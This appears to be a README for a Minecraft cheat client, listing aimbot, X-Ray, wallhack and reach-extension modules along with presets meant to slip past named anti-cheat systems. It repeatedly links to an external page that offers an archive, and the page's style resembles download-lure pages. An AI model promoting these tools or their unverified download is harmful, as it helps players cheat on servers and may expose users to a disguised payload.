# Impact Client v2026 - Minecraft Utility Mod

> **A feature-rich utility mod for Minecraft Impact Client** that adds automation, combat helpers, and visual tooling for Windows users in PvP and survival play.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/seanlabs2001/impact-client-script-loader?style=flat-square)](https://github.com/seanlabs2001/impact-client-script-loader)

---

<p align="center">
  <a href="https://seanlabs2001.github.io/impact-client-script-loader/">
    <img src="https://img.shields.io/badge/Download-Impact%20Client%20Script-brightgreen?style=for-the-badge" alt="Download Impact Client Script">
  </a>
</p>

> **[Direct Download - Impact Client](https://seanlabs2001.github.io/impact-client-script-loader/)**

---

[Download Latest Build](https://seanlabs2001.github.io/impact-client-script-loader/)

---

## Project Summary

Impact Client v2026 packages a set of Minecraft modules built for the Impact Client, aimed at players who want faster PvP actions and smoother survival workflows. It combines mining automation, aim assistance, and on-screen visual tools to make SMP navigation and combat management more efficient. JavaScript-based modules are included for users who want to extend behavior with custom scripts.

This 2026 build is tuned for stability on widely used Survival Multiplayer servers. It ships with prepared anti-cheat compatibility settings and presets for common minigame modes, so the archive can be used right away for combat macros, ore detection overlays, and block interaction support without additional configuration.

---

## Module List

- **AutoMine** -- Automated block breaking with configurable patterns and delay adjustments
- **Aimbot** -- Target acquisition assistance for melee and ranged combat
- **X-Ray** -- Ore and valuable block highlighting through standard terrain rendering
- **GhostHand** -- Remote block interaction for chests, levers, and doors
- **Wallhack** -- Entity outline visibility through solid obstacles
- **JS Modules** -- Extendable scripting support for custom automation routines
- **Anti-Cheat Configs** -- Pre-tuned settings for major SMP protection systems
- **Minigame Presets** -- Quick-load configurations for bedwars, skywars, and kitpvp

---

## Installation

Grab the newest archive from the link above, then unpack it into the Impact Client mods directory. Make sure Fabric Loader is installed for the Minecraft version you plan to use.

```bash
# Example extraction path (Windows)
%appdata%\.minecraft\mods\impact-client
```

After that, start Minecraft with the Impact Client profile and open the module menu using the default keybind, right Shift.

---

## Configuration Table

| Setting | Default | Description |
|---------|---------|-------------|
| Aimbot Range | 6 blocks | Maximum targeting distance |
| AutoMine Delay | 0ms | Tick delay between break actions |
| X-Ray Mode | Ores | Toggle between ores/chests/mobs |
| GhostHand Reach | 5 blocks | Interaction range extension |
| Anti-Cheat Profile | NCP | Switch between NCP, AAC, Spartan |

Hotkeys can be rebound through the Impact Client settings interface.

---

## Compatibility

- **Minecraft Versions:** 1.16.5, 1.18.2, 1.19.4, 1.20.1
- **Platform:** Windows 10/11 (64-bit)
- **Loader:** Fabric Loader 0.15+
- **Limitations:** Some servers with aggressive anti-cheat may flag certain modules. Performance impact varies with render distance and active modules.

---

## FAQ

**How do I install the script?**  
Unzip the archive into your `.minecraft/mods` folder and confirm that Fabric Loader is installed.

**Will I receive updates automatically?**  
There is no auto-update path. Visit the download page from time to time and re-download new releases manually.

**Can I customize the modules?**  
Yes. The Impact Client GUI exposes adjustable parameters for all modules, and JS modules can be edited directly.

**Does this work on all servers?**  
It depends on the anti-cheat stack used by the server. Relaxed SMP environments are typically the most compatible.

**Where are saved configurations stored?**  
After the first launch, config files are saved in `.minecraft/config/impact/`.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
